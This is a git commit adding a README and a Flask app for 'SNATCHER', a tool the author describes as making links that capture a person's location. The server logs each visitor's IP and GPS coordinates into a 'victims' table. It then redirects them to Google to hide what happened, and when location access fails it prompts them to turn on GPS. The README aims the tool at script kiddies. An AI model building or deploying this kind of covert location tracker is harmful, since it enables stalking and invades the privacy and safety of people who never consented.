e1674f8f66a0938cb05ee923518f4fc3c8ba31a6
velex <velex@dnmx.org>
2022-05-07 02:41:41 +0300

    ugh

---
+++ README/README.md
@@ -0,0 +1,20 @@
+# Located!
+
+author : [Velex](https://www.instagram.com/velex.8/).
+
+***SNATCHER*** is a tool that helps making links snatch someone location and other things soon, very simple and easy and its **not complete**, there's no Thought of adding ngrok because it does a lot of errors, and it stores targets info in a db;)
+
+
+how to run the tool:  
+
+1. you should have python3 installed
+2. clone the repo
+3. run "cd snatcher/"
+4. run "pip install -r reqs.txt"
+5. run "python3 app.py"
+
+> things i'll add later (maybe).
+
+* **A GUI option** to the main script that will make it easier for script kiddies and everyone
+
+ 
---
+++ app.py
@@ -0,0 +1,37 @@
+from flask import Flask,render_template,request,redirect
+app = Flask('app')
+import sqlite3,logging,colorama
+log = logging.getLogger('werkzeug') 
+log.setLevel(logging.ERROR)
+
+con=sqlite3.connect("vic.db")
+cur=con.cursor()
+cur.execute('CREATE TABLE IF NOT EXISTS victims ("ip" TEXT,"cords" TEXT,"date" TEXT)')
+con.commit()
+con.close()
+
+color=colorama.Fore
+style=colorama.Style
+print(style.BRIGHT)
+@app.route('/')
+def hello_world():
+	print(color.YELLOW+"[?] VICTIM ENTERED THE MAIN PAGE, WAITING FOR FORWORDING...")
+	return render_template("index.html")
+
+
+@app.route('/gotcha/<lati>/<long>/<date>')
+def hey(lati,long,date):
+	con=sqlite3.connect("vic.db")
+	cur=con.cursor()
+	cur.execute("INSERT INTO victims(ip,cords,date) VALUES(?,?,?);",(request.remote_addr,long+","+lati,date))
+	con.commit()
+	con.close()
+	print(color.GREEN+"[$] GOTCHA!")
+	return redirect("https://www.google.com")
+
+
+@app.route("/fail")
+def fail():
+	print(color.RED+f"[!] Failed to get victim's location, Their GPS might be off, Victim IP: <{request.remote_addr}>")
+	return "TURN ON GPS TO CONFIRM YOUR LOCATION..."
+app.run(host='0.0.0.0', port=8000)
